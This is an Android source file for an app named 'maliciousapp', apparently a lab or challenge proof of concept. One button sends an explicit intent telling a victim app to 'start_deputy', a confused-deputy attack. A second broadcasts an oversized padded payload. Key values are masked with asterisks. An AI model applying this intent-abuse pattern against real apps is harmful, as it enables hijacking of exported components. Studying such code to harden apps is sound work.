package com.example.maliciousapp;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Base64;
import android.widget.Button;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.nio.charset.Charset;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });


        Button startDeputy = findViewById(R.id.deputy);

        startDeputy.setOnClickListener((v)->{
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.MainActivity"));
            intent.putExtra("command", "start_deputy");
            startActivity(intent);
        });

        Button sendPayload = findViewById(R.id.send_payload);

        sendPayload.setOnClickListener((v)-> {
            Intent intent2 = new Intent("********");
            Bundle bundle = new Bundle();
            String payload = "";
            for (int i = 0; i < 200; i++) {
                payload += "C";
            }

            String as = "";
            for (int i = 0; i < 50; i++) {
                as += "**********";
            }

            bundle.putString("request", *********);

            intent2.putExtras(bundle);

            intent2.putExtra("n1", *******);

            intent2.putExtra("n2", ******);

            intent2.putExtra("******", "******");

            sendBroadcast(intent2);
        });
    }
}